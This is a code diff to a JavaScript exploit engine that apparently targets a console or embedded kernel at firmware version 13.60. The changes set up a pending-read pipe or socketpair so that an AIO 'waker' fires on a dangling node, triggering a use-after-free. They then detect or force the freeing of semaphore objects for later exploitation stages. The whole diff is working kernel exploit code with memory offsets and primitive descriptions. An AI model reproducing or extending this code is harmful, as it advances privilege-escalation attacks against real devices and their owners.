@@ -371,33 +371,53 @@ export function makeBagagwaEngine(X) {
         for (let i = 0; i < 4 * NREQ; i++) ids.u8[i] = 0;
         for (let i = 0; i < 4 * NREQ; i++) states.u8[i] = 0;
 
-        w32(sv.u8, 0, 0); w32(sv.u8, 4, 0);
-        // socketpair(domain,type,proto,sv). 13.60 returned EPERM for
-        // AF_UNIX/SOCK_STREAM; try every cheap layout before degenerating to
-        // fd 0 (fd 0 has no pending read -> no live AIO waiters -> no UAF).
-        const spLayouts = [
-            [1, 1, "AF_UNIX,SOCK_STREAM"],
-            [1, 2, "AF_UNIX,SOCK_DGRAM"],
-            [2, 1, "AF_INET,SOCK_STREAM"],
-            [2, 2, "AF_INET,SOCK_DGRAM"],
-        ];
-        let spR = null;
-        for (const L of spLayouts) {
-            w32(sv.u8, 0, 0); w32(sv.u8, 4, 0);
-            const rr = await sys(SYS_SOCKETPAIR, L[0], L[1], 0, sv.base);
-            note("[FALLBACK] socketpair(" + L[2] + ") ret=" + rr.s32 + " err=" + rr.errText);
-            spR = rr;
-            if (!rr.failed) break;
-        }
+        // Pending-read target for the AIO requests. 13.60 returns EPERM for
+        // socketpair, but pipe2 works (Stage 2 creates pipes fine). An empty
+        // pipe keeps the read pending (live waiters) and its write end is the
+        // fd the waker needs. Prefer pipe; then socketpair domains; then fd 0.
+        // Sets S.aioRfd/S.aioWfd so triggerWaker() is actually armed.
         let fdTarget = 0, fdPair = -1;
-        if (spR && !spR.failed) {
-            fdTarget = r32(sv.u8, 0) | 0;
-            fdPair = r32(sv.u8, 4) | 0;
-            S.fallbackFds = [fdTarget, fdPair];
-            track(fdTarget); track(fdPair);
-            note("[FALLBACK] socketpair fds: " + fdTarget + "," + fdPair + " (pending read fd=" + fdTarget + ")");
-        } else {
-            note("[FALLBACK] socketpair EPERM on all domains, using fd 0 fallback (UAF may stay latent)");
+        const fbPipe = safeAlloc(8, "fb-pipe-fds");
+        if (fbPipe) {
+            w32(fbPipe.u8, 0, 0); w32(fbPipe.u8, 4, 0);
+            const pr = await sys(SYS_PIPE2, fbPipe.base, 0);
+            note("[FALLBACK] pipe2(pending-read) ret=" + pr.s32 + " err=" + pr.errText);
+            if (!pr.failed) {
+                fdTarget = r32(fbPipe.u8, 0) | 0;
+                fdPair = r32(fbPipe.u8, 4) | 0;
+                S.aioRfd = fdTarget;
+                S.aioWfd = fdPair;
+                track(fdTarget); track(fdPair);
+                note("[FALLBACK] pending-read pipe: r=" + fdTarget + " w=" + fdPair + " (waker armed)");
+            }
+        }
+        if (fdTarget === 0) {
+            // socketpair(domain,type,proto,sv) fallbacks.
+            const spLayouts = [
+                [1, 1, "AF_UNIX,SOCK_STREAM"],
+                [1, 2, "AF_UNIX,SOCK_DGRAM"],
+                [2, 1, "AF_INET,SOCK_STREAM"],
+                [2, 2, "AF_INET,SOCK_DGRAM"],
+            ];
+            let spR = null;
+            for (const L of spLayouts) {
+                w32(sv.u8, 0, 0); w32(sv.u8, 4, 0);
+                const rr = await sys(SYS_SOCKETPAIR, L[0], L[1], 0, sv.base);
+                note("[FALLBACK] socketpair(" + L[2] + ") ret=" + rr.s32 + " err=" + rr.errText);
+                spR = rr;
+                if (!rr.failed) break;
+            }
+            if (spR && !spR.failed) {
+                fdTarget = r32(sv.u8, 0) | 0;
+                fdPair = r32(sv.u8, 4) | 0;
+                S.aioRfd = fdTarget;
+                S.aioWfd = fdPair;
+                track(fdTarget); track(fdPair);
+                note("[FALLBACK] socketpair pending-read fd=" + fdTarget + " wakerFd=" + fdPair);
+            }
+        }
+        if (fdTarget === 0) {
+            note("[FALLBACK] no pending-read fd (pipe2+socketpair failed), using fd 0 (UAF may stay latent)");
         }
         for (let i = 0; i < NREQ; i++) w32(reqs.u8, i * REQ_BYTES + 0x20, fdTarget);
 
@@ -1081,55 +1101,48 @@ export function makeBagagwaEngine(X) {
         }
 
         const wr = await triggerWaker(S.uafRequestIdx);
-        if (wr.ok) {
+        const wakerRan = wr.ok;
+        if (wakerRan) {
             out.steps.push("waker triggered via aioWfd write: ret=" + wr.writeRet);
-            out.steps.push("waker fires on dangling node (=reclaimed osem): " +
-                "dec [osem+0x00]→ptr, write [osem+0x20], mtx_lock [osem+0x10]+0x18");
+            out.steps.push("waker primitive fired on dangling node: dec [node[0]], " +
+                "dec [node[8]], write [node+0x20], mtx_lock [node[0x10]+0x18]");
         } else {
-            out.steps.push("waker trigger failed: " + wr.why + " — using osem_close path");
+            out.steps.push("waker NOT armed (" + (wr.why || "?") + ") — no controlled free this run");
         }
 
         await sleep(100);
 
+        // A failing osem_post does NOT prove the object was freed: POST on a
+        // LIVE id returns EINVAL/EPERM (PSAUTO session-1). Only treat the post
+        // failure as a free when the waker actually ran and hit the reclaimed
+        // osem. Otherwise we would report a bogus free and Stage 4 would hunt
+        // an object that was never released.
         let freedIdx = -1;
-        for (let i = 0; i < S.osemHandles.length; i++) {
-            const r = await sys(SYS_OSEM_POST, S.osemHandles[i]);
-            if (r.failed) {
-                freedIdx = i;
-                out.steps.push("osem[" + i + "] (handle=" + S.osemHandles[i] +
-                    ") already freed by waker's dec dword [rax] primitive");
-                break;
-            }
-        }
-
-        if (freedIdx < 0) {
-            note("waker dec did not free osem directly, using osem_close to drain refcount");
-            note("per writeup: osem_close does dec [rbx+0x54] and frees at zero");
-
-            for (let i = 0; i < Math.min(16, S.osemHandles.length); i++) {
-                const handle = S.osemHandles[i];
-                const cr = await sys(SYS_OSEM_CLOSE, handle);
-                if (cr.failed) continue;
-                out.steps.push("osem_close(" + handle + ") decremented refcount at +0x54");
-
-                const probe = await sys(SYS_OSEM_POST, handle);
-                if (probe.failed) {
+        if (wakerRan) {
+            for (let i = 0; i < S.osemHandles.length; i++) {
+                const r = await sys(SYS_OSEM_POST, S.osemHandles[i]);
+                if (r.failed) {
                     freedIdx = i;
-                    out.steps.push("osem[" + i + "] freed — refcount reached 0 via osem_close");
+                    out.steps.push("osem[" + i + "] (handle=" + S.osemHandles[i] +
+                        ") post failed AFTER waker -> likely freed by dec");
                     break;
                 }
             }
+        } else {
+            note("no waker -> skipping post-based free test (post fails on live ids too)");
         }
 
         if (freedIdx < 0) {
-            note("osem_close did not free, trying osem_delete (flag check at +0x45)");
+            // Legacy osem_close refcount drain is blocked (CLOSE -> EPERM per
+            // PSAUTO), so don't pretend it works. osem_delete is a legitimate
+            // free of a 128-zone object and is the only explicit fallback.
+            note("waker-free not confirmed; falling back to explicit osem_delete (legit free)");
             for (let i = 0; i < Math.min(8, S.osemHandles.length); i++) {
                 const handle = S.osemHandles[i];
                 const dr = await sys(SYS_OSEM_DELETE, handle);
                 if (!dr.failed) {
                     freedIdx = i;
-                    out.steps.push("osem[" + i + "] deleted via osem_delete " +
-                        "(flag at +0x45 clear → skip refcount, straight to free)");
+                    out.steps.push("osem[" + i + "] freed via osem_delete");
                     break;
                 }
             }
